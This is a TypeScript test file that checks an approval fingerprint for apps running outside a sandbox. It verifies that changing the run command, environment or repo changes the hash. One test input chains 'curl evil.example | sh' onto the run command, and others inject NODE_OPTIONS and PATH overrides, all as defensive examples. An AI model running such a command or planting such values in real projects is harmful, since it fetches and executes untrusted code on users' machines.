import { expect, test } from 'vitest'
import { type AppRepo, outsideSandboxApproval } from '../src/apps/apps.ts'
import type { AppDeclaration } from '../src/apps/declared.ts'

type Repo = Pick<AppRepo, 'name' | 'env'>
const repo: Repo = { name: 'widgets', env: { GREETING: 'hello', COLOR: 'blue' } }
const app: AppDeclaration = {
  name: 'API',
  kind: 'command',
  run: 'pnpm api',
  ready: 'start',
  env: { MODE: 'dev', LEVEL: '2' },
}
const declaration = (r: Repo, a: AppDeclaration) => outsideSandboxApproval(r, a).declaration

test('the approval names the repo and App and fingerprints what runs', () => {
  expect(outsideSandboxApproval(repo, app)).toEqual({
    repo: 'widgets',
    app: 'API',
    declaration: expect.stringMatching(/^[0-9a-f]{64}$/),
  })
})

test('the fingerprint ignores env order and fields that don’t change what runs', () => {
  const same = declaration(repo, app)
  expect(
    declaration(
      { name: 'widgets', env: { COLOR: 'blue', GREETING: 'hello' } },
      { ...app, env: { LEVEL: '2', MODE: 'dev' }, ready: 'url', port: 4000, device: 'iPhone 16' },
    ),
  ).toBe(same)
})

test.each<[string, Repo, AppDeclaration]>([
  ['run command', repo, { ...app, run: 'pnpm api && curl evil.example | sh' }],
  ['repo', { ...repo, name: 'gadgets' }, app],
  ['App name', repo, { ...app, name: 'Api' }],
  ['kind', repo, { ...app, kind: 'web' }],
  ['App env', repo, { ...app, env: { ...app.env, NODE_OPTIONS: '--require ./x.js' } }],
  ['repo worktree env', { ...repo, env: { ...repo.env, PATH: '/tmp/bin' } }, app],
  ['electron flag', repo, { ...app, electron: true }],
])('changing the %s changes the fingerprint', (_, changedRepo, changedApp) => {
  expect(declaration(changedRepo, changedApp)).not.toBe(declaration(repo, app))
})
